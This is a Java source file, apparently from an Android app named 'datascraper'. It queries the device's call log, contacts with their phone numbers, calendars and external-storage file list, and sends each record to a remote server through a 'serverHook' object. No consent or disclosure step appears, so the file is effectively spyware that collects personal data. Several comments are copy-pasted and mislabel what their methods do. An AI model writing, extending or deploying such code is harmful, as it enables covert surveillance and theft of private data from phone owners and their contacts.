package com.example.alex.datascraper;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by Alex on 10/22/2017.
 */

public class modalityHabits extends AppCompatActivity {

    // scrapes call logs and sends them to a server
    public void getCalls(Context mContext, serverHook hook){
        // array of all texts
        List<String> calls = new ArrayList<>();

        // inbox cursor
        Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);

        String colName, val;

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String msgData = "{";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    colName = cursor.getColumnName(idx);
                    val = cursor.getString(idx);
                    if(val == null || val.equals("")){
                        msgData += "\"" + colName + "\":\"null\",";
                    }
                    else{
                        colName = colName.replace("\"", "'");
                        colName = colName.replace("\n", " ");

                        val = val.replace("\"", "'");
                        val = val.replace("\n", " ");

                        msgData += "\""
                                + colName
                                + "\":\""
                                + val
                                + "\",";
                    }

                }
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "}";
                calls.add(msgData);
            } while (cursor.moveToNext());
        } else {
            System.out.println("No messages found");
        }
        cursor.close();



        for (String t : calls) {
            hook.sendToServer("log", t);
        }
    }

    // scrapes contacts and sends them to a server
    public void getContacts(Context mContext,serverHook hook){
        ContentResolver cr = mContext.getContentResolver();
        Cursor phone = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if(phone == null){
            return;
        }
        Cursor conCursor;
        String id, name, number;
        String contact;
        while(phone != null && phone.moveToNext()){
            name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            name = name.replace("\"", "'");
            name = name.replace("\n", " ");
            id = phone.getString(phone.getColumnIndex(ContactsContract.Contacts._ID));
            contact = "{";
            contact += "\"name\":\"" + name + "\",";

            if(phone.getInt(phone.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0){
                conCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id},
                        null);
                while(conCursor.moveToNext()){
                    number = conCursor.getString(conCursor.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    contact += "\"number\":\"" + number + "\",";
                }
                conCursor.close();
            }
            contact = contact.substring(0, contact.length()-1);
            contact += '}';
            hook.sendToServer("contact",contact);

        }
        phone.close();
    }

    // scrapes call logs and sends them to a server
    public void getCalendar(Context mContext,serverHook hook){
        // array of all texts
        List<String> events = new ArrayList<>();

        // inbox cursor
        Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://com.android.calendar/calendars"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String colName, val;
                String eventData = "{";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    colName = cursor.getColumnName(idx);
                    val = cursor.getString(idx);
                    if(val == null || val.equals("")){
                        eventData += "\"" + colName + "\":\"null\",";
                    }
                    else{
                        colName = colName.replace("\"", "'");
                        colName = colName.replace("\n", " ");

                        val = val.replace("\"", "'");
                        val = val.replace("\n", " ");

                        eventData += "\""
                                + colName
                                + "\":\""
                                + val
                                + "\",";
                    }
                }
                eventData = eventData.substring(0, eventData.length()-1);
                eventData += '}';
                hook.sendToServer("calendar",eventData);
            } while (cursor.moveToNext());
        } else {
            System.out.println("No events found");
        }
        cursor.close();

    }

    // scrapes call logs and sends them to a server
    public void getStorage(Context mContext,serverHook hook){
        // array of all texts
        List<String> events = new ArrayList<>();

        // inbox cursor
        Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://media/external/file/"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String colName, val;
                String msg = "{";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    colName = cursor.getColumnName(idx);
                    val = cursor.getString(idx);
                    if(val == null || val.equals("")){
                        msg += "\"" + colName + "\":\"null\",";
                    }
                    else{
                        colName = colName.replace("\"", "'");
                        colName = colName.replace("\n", " ");

                        val = val.replace("\"", "'");
                        val = val.replace("\n", " ");

                        msg += "\""
                                + colName
                                + "\":\""
                                + val
                                + "\",";
                    }
                }
                msg = msg.substring(0, msg.length()-1);
                msg += "}";
                hook.sendToServer("file", msg);
            } while (cursor.moveToNext());
        } else {
            System.out.println("No events found");
        }
        cursor.close();



        for (String e : events) {
            //
        }
    }

}
